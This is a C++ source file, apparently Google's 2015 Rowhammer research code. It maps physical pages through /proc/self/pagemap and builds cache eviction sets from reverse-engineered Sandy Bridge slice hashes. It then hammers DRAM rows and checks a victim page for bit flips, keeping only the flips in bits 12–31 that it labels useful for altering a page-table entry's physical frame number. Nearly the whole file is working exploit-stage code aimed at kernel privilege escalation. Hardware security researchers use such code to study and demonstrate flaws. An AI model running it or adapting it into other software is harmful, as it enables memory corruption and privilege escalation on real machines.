// Copyright 2015, Google, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <unistd.h>

#include <algorithm>
#include <vector>

const size_t memory_size = ((size_t) 900 * 4) << 20;

const size_t page_size = 0x1000;

struct HammerAddrs {
  uint64_t agg1;
  uint64_t agg2;
  uint64_t victim;
};

// Extract the physical page number from a Linux /proc/PID/pagemap entry.
uint64_t frame_number_from_pagemap(uint64_t value) {
  return value & ((1ULL << 54) - 1);
}

uint64_t get_physical_addr(uintptr_t virtual_addr) {
  int fd = open("/proc/self/pagemap", O_RDONLY);
  assert(fd >= 0);

  off_t pos = lseek(fd, (virtual_addr / page_size) * 8, SEEK_SET);
  assert(pos >= 0);
  uint64_t value;
  int got = read(fd, &value, 8);
  assert(got == 8);
  int rc = close(fd);
  assert(rc == 0);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));

  uint64_t frame_num = frame_number_from_pagemap(value);
  return (frame_num * page_size) | (virtual_addr & (page_size - 1));
}

static int get_cache_slice(uint64_t phys_addr) {
  // Hash functions from the paper "Practical Timing Side Channel
  // Attacks Against Kernel Space ASLR".
  //
  // On 4 core machines, the hash function produces a 2-bit cache
  // slice number.  On 2 core machines, the hash function appears to
  // be the XOR of those two bits.

  // "h1" function.
  // static const int bits[] = { 18, 19, 21, 23, 25, 27, 29, 30, 31 };

  // "h2" function.
  // static const int bits[] = { 17, 19, 20, 21, 22, 23, 24, 26, 28, 29, 31 };

  // XOR of h1 and h2.
  static const int bits[] = { 17, 18, 20, 22, 24, 25, 26, 27, 28, 30 };
  int count = sizeof(bits) / sizeof(bits[0]);
  int hash = 0;
  for (int i = 0; i < count; i++) {
    hash ^= (phys_addr >> bits[i]) & 1;
  }
  return hash;
}

static bool in_same_cache_set(uint64_t phys1, uint64_t phys2) {
  // For Sandy Bridge, the bottom 17 bits determine the cache set
  // within the cache slice (or the location within a cache line).
  uint64_t mask = ((uint64_t) 1 << 17) - 1;
  return ((phys1 & mask) == (phys2 & mask) &&
          get_cache_slice(phys1) == get_cache_slice(phys2));
}

class Timer {
  struct timeval start_time_;

 public:
  Timer() {
    // Note that we use gettimeofday() (with microsecond resolution)
    // rather than clock_gettime() (with nanosecond resolution) so
    // that this works on Mac OS X, because OS X doesn't provide
    // clock_gettime() and we don't really need nanosecond resolution.
    int rc = gettimeofday(&start_time_, NULL);
    assert(rc == 0);
  }

  double get_diff() {
    struct timeval end_time;
    int rc = gettimeofday(&end_time, NULL);
    assert(rc == 0);
    return (end_time.tv_sec - start_time_.tv_sec
            + (double) (end_time.tv_usec - start_time_.tv_usec) / 1e6);
  }

  void print_iters(uint64_t iterations) {
    double total_time = get_diff();
    double iter_time = total_time / iterations;
    printf("  %.3f nanosec per iteration: %g sec for %lli iterations\n",
           iter_time * 1e9, total_time, (long long) iterations);
  }
};

class PhysPageFinder {
  static const size_t num_pages = memory_size / page_size;

  uint64_t *phys_addrs; // Array
  uintptr_t mem;

  void unmap_range(uintptr_t start, uintptr_t end) {
    assert(start <= end);
    if (start < end) {
      int rc = munmap((void *) start, end - start);
      assert(rc == 0);
    }
  }

  uintptr_t get_virt_addr(size_t i) {
    return mem + i * page_size;
  }

public:
  PhysPageFinder() {
    printf("PhysPageFinder: Allocate...\n");
    mem = (uintptr_t) mmap(NULL, memory_size, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
    assert(mem != (uintptr_t) MAP_FAILED);

    phys_addrs = new uint64_t[num_pages];
    assert(phys_addrs);

    printf("PhysPageFinder: Build page map...\n");
    int fd = open("/proc/self/pagemap", O_RDONLY);
    assert(fd >= 0);
    ssize_t read_size = sizeof(phys_addrs[0]) * num_pages;
    ssize_t got = pread(fd, phys_addrs, read_size, (mem / page_size) * 8);
    assert(got == read_size);
    int rc = close(fd);
    assert(rc == 0);
    for (size_t i = 0; i < num_pages; i++) {
      // We're not checking the "page present" field here because it's
      // not always set.  We are probably allocating more than the
      // kernel really wants to give us.
      phys_addrs[i] = frame_number_from_pagemap(phys_addrs[i]) * page_size;
    }
  }

  bool find_page(uint64_t phys_addr, uintptr_t *virt_addr) {
    for (size_t i = 0; i < num_pages; i++) {
      if (phys_addrs[i] / page_size == phys_addr / page_size) {
        *virt_addr = get_virt_addr(i);
        return true;
      }
    }
    return false;
  }

  bool find_same_cache_set(uintptr_t virt_addr,
                           uintptr_t *result_addrs,
                           int count) {
    size_t rand_offset = random();

    uint64_t phys_addr = get_physical_addr(virt_addr);
    int found = 0;
    for (size_t j = 0; j < num_pages && found < count; j++) {
      size_t i = (j + rand_offset) % num_pages;

      if (in_same_cache_set(phys_addrs[i], phys_addr) &&
          phys_addrs[i] != phys_addr) {
        result_addrs[found++] = get_virt_addr(i);
      }
    }
    if (found < count) {
      printf("Needed to find %i addresses in same cache set as phys addr 0x%"
             PRIx64 " but found only %i\n",
             count, phys_addr, found);
      return false;
    }
    return true;
  }

  void unmap_other_pages(uintptr_t *keep_addrs, uintptr_t *keep_addrs_end) {
    printf("PhysPageFinder: Unmapping...\n");
    // Coalesce munmap() calls for speed.
    std::sort(keep_addrs, keep_addrs_end);
    uintptr_t addr_to_free = mem;
    uintptr_t end_addr = mem + memory_size;
    while (keep_addrs < keep_addrs_end) {
      unmap_range(addr_to_free, *keep_addrs);
      addr_to_free = *keep_addrs + page_size;
      keep_addrs++;
    }
    unmap_range(addr_to_free, end_addr);
  }
};

void clflush(uintptr_t addr) {
  asm volatile("clflush (%0)" : : "r" (addr) : "memory");
}

class BitFlipper {
  static const int hammer_count = 2000000;

  PhysPageFinder *finder;

  const struct HammerAddrs *phys;
  uintptr_t agg1;
  uintptr_t agg2;
  uintptr_t victim;

  // Offset, in bytes, of 64-bit victim location from start of page.
  int flip_offset_bytes;
  // The bit number that changes.
  int bit_number;
  // 1 if this is a 0 -> 1 bit flip, 0 otherwise.
  uint8_t flips_to;

  bool cached_hammer(uintptr_t agg) {
    int num_addrs = 12 + 2;
    uintptr_t addrs[num_addrs];
    addrs[0] = agg;
    if (!finder->find_same_cache_set(agg, &addrs[1], num_addrs - 1))
      return false;
    Timer t;
    int sum = 0;
    for (int iter = 0; iter < hammer_count; iter++) {
      for (int i = 0; i < num_addrs; i++) {
        sum += *(volatile int *) addrs[i];
      }
      // *(volatile int *) agg1;
      // clflush(agg1);
      // *(volatile int *) agg2;
      // clflush(agg2);
    }
    // t.print_iters(hammer_count * num_addrs);
    double time = t.get_diff();
    int refresh_ms = 64;
    double access_time = time / hammer_count;
    printf("    time per addr: %i ns, accesses per address per %i ms: %i [sum=%i]\n",
           (int) (time * 1e9 / (hammer_count * num_addrs)),
           refresh_ms,
           (int) (refresh_ms * 1e-3 / access_time), sum);
    return true;
  }

  bool hammer_and_check(uint64_t init_val) {
    uint64_t *victim_end = (uint64_t *) (victim + page_size);

    // Initialize victim page.
    for (uint64_t *addr = (uint64_t *) victim; addr < victim_end; addr++) {
      *addr = init_val;
      // Flush so that the later check does not just return cached data.
      clflush((uintptr_t) addr);
    }

    if (!cached_hammer(agg1))
      return false;
    if (!cached_hammer(agg2))
      return false;
    // hammer_pair();

    // Check for bit flips.
    bool seen_flip = false;
    for (uint64_t *addr = (uint64_t *) victim; addr < victim_end; addr++) {
      uint64_t val = *addr;
      if (val != init_val) {
        seen_flip = true;
        flip_offset_bytes = (uintptr_t) addr - victim;
        printf("  Flip at offset 0x%x: 0x%llx\n",
               flip_offset_bytes, (long long) val);
        for (int bit = 0; bit < 64; bit++) {
          if (((init_val >> bit) & 1) != ((val >> bit) & 1)) {
            flips_to = (val >> bit) & 1;
            bit_number = bit;
            printf("    Changed bit %i to %i\n", bit, flips_to);
          }
        }
        exit(1);
      }
    }
    return seen_flip;
  }

public:
  BitFlipper(PhysPageFinder *finder, const struct HammerAddrs *phys):
      finder(finder), phys(phys), flips_to(0) {}

  void hammer_pair() {
    for (int i = 0; i < hammer_count; i++) {
      *(volatile int *) agg1;
      *(volatile int *) agg2;
      clflush(agg1);
      clflush(agg2);
    }
  }

  bool find_pages() {
    return (finder->find_page(phys->agg1, &agg1) &&
            finder->find_page(phys->agg2, &agg2) &&
            finder->find_page(phys->victim, &victim));
  }

  bool initial_hammer() {
    // Test both 0->1 and 1->0 bit flips.
    bool seen_flip = false;
    seen_flip |= hammer_and_check(0);
    seen_flip |= hammer_and_check(~(uint64_t) 0);
    return seen_flip;
  }

  int get_flip_offset_bytes() { return flip_offset_bytes; }
  int get_bit_number() { return bit_number; }
  uint8_t get_flips_to() { return flips_to; }

  void retry_to_check() {
    printf("Retry...\n");
    int retries = 10;
    int hits = 0;
    uint64_t init_val = flips_to ? 0 : ~(uint64_t) 0;
    for (int i = 0; i < retries; i++) {
      // To save time, only try one initial value now.
      if (hammer_and_check(init_val)) {
        hits++;
      }
    }
    printf("Got %i hits out of %i\n", hits, retries);
    assert(hits > 0);
  }

  void unmap_other_pages(PhysPageFinder *finder) {
    uintptr_t pages[] = { agg1, agg2, victim };
    finder->unmap_other_pages(pages, pages + 3);
  }
};

BitFlipper *find_bit_flipper(const char *addrs_file) {
  std::vector<HammerAddrs> flip_addrs;
  FILE *fp = fopen(addrs_file, "r");
  if (!fp) {
    printf("Can't open '%s': %s\n", addrs_file, strerror(errno));
    exit(1);
  }
  while (!feof(fp)) {
    HammerAddrs addrs;
    int got = fscanf(fp, "RESULT PAIR,"
                     "0x%" PRIx64 ","
                     "0x%" PRIx64 ","
                     "0x%" PRIx64,
                     &addrs.agg1, &addrs.agg2, &addrs.victim);
    if (got == 3) {
      flip_addrs.push_back(addrs);
    }
    // Skip the rest of the line.
    for (;;) {
      int ch = fgetc(fp);
      if (ch == '\n' || ch == EOF)
        break;
    }
  }
  fclose(fp);

  PhysPageFinder finder;
  for (;;) {
    for (size_t i = 0; i < flip_addrs.size(); i++) {
      const struct HammerAddrs *addrs = &flip_addrs[i];
      BitFlipper *flipper = new BitFlipper(&finder, addrs);
      bool found = flipper->find_pages();
      printf("Entry %zi: 0x%09llx, 0x%09llx, 0x%09llx - %s\n", i,
             (long long) addrs->agg1,
             (long long) addrs->agg2,
             (long long) addrs->victim,
             found ? "found" : "missing");
      // printf("  same cache set = %i\n",
      //        in_same_cache_set(addrs->agg1, addrs->agg2));
      if (found) {
        if (flipper->initial_hammer()) {
          int bit = flipper->get_bit_number();
          // Is this bit flip useful for changing the physical page
          // number in a PTE?  Assume 4GB of physical pages.
          if (bit >= 12 && bit < 32) {
            printf("Useful bit flip -- continuing...\n");
            flipper->unmap_other_pages(&finder);
            flipper->retry_to_check();
            return flipper;
          } else {
            printf("  We don't know how to exploit a flip in bit %i\n", bit);
          }
        }
      }
      delete flipper;
    }
  }
  printf("No usable bit flips found\n");
  exit(1);
}


int main() {
  const char *addrs_file = "log";
  find_bit_flipper(addrs_file);
  return 0;
}
